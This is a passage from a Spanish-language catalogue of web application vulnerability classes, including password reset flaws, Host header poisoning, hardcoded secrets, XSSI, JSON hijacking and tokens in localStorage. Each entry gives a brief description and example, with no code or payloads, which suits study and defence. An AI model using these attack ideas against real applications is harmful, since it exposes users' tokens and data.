**Descripción**: Incluir tokens no sensibles en URLs.

**Ejemplo**: Incluir un token de preferencia de idioma en la URL.

### Weak Password Reset Implementation

**Descripción**: Implementación débil del proceso de restablecimiento de contraseña.

**Ejemplo**: No expirar tokens de restablecimiento de contraseña después de su uso.

### Password Reset Token Sent Over HTTP

**Descripción**: Envío de tokens de restablecimiento de contraseña a través de HTTP en lugar de HTTPS.

**Ejemplo**: Enviar un enlace de restablecimiento de contraseña a través de una conexión no cifrada.

### Token Leakage via Host Header Poisoning

**Descripción**: Filtración de tokens debido a la manipulación del encabezado Host.

**Ejemplo**: Manipular el encabezado Host para redirigir tokens a un servidor controlado por el atacante.

### Mixed Content (HTTPS Sourcing HTTP)

**Descripción**: Mezcla de contenido seguro (HTTPS) con contenido no seguro (HTTP).

**Ejemplo**: Una página HTTPS que carga scripts o imágenes desde HTTP.

### Sensitive Data Hardcoded

**Descripción**: Datos sensibles codificados directamente en el código fuente.

**Ejemplo**: Claves API o contraseñas en archivos de configuración de la aplicación.

#### OAuth Secret

**Descripción**: Secretos OAuth codificados en el código fuente.

**Ejemplo**: Un cliente OAuth que tiene el secreto del cliente codificado en el código fuente.

#### File Paths

**Descripción**: Rutas de archivos codificadas en el código fuente.

**Ejemplo**: Rutas de archivos en el servidor expuestas en el código fuente accesible públicamente.

### Internal IP Disclosure

**Descripción**: Exposición de direcciones IP internas.

**Ejemplo**: Una aplicación que revela direcciones IP internas en respuestas de error o en la interfaz web.

### Cross Site Script Inclusion (XSSI)

**Descripción**: Inclusión de scripts de otros sitios que puede llevar a la exposición de datos.

**Ejemplo**: Cargar un script desde un dominio no confiable que extrae datos de la aplicación.

### JSON Hijacking

**Descripción**: Explotación de vulnerabilidades en aplicaciones que responden con JSON.

**Ejemplo**: Usar etiquetas `<script>` para obtener respuestas JSON desde aplicaciones vulnerables.

#### Via localStorage/sessionStorage

**Descripción**: Exposición de datos sensibles almacenados en localStorage o sessionStorage.

**Ejemplo**: Tokens de autenticación almacenados en localStorage que pueden ser accedidos por scripts maliciosos.

#### Sensitive Token

**Descripción**: Tokens sensibles almacenados en localStorage o sessionStorage.

**Ejemplo**: Almacenar un token JWT en localStorage.

#### Non-Sensitive Token

**Descripción**: Tokens no sensibles almacenados en localStorage o sessionStorage.

**Ejemplo**: Almacenar un token de preferencia de usuario en sessionStorage.